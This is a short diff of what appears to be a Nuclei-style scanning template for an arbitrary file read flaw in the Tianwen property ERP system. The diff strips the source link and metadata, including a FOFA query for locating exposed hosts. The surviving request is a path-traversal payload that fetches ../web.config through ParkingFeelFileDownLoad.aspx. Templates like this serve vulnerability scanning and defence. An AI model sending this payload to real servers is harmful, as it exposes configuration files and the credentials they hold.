@@ -3,12 +3,8 @@ info:
   name: 天问物业ERP系统ParkingFeelFileDownLoad存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gydda75zva35w0qx'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gydda75zva35w0qx
-    fofa: body="天问物业ERP系统"
 http:
 - raw:
   - 'GET /HM/M_main/InformationManage/ParkingFeelFileDownLoad.aspx?ParkingFile=../web.config HTTP/1.1
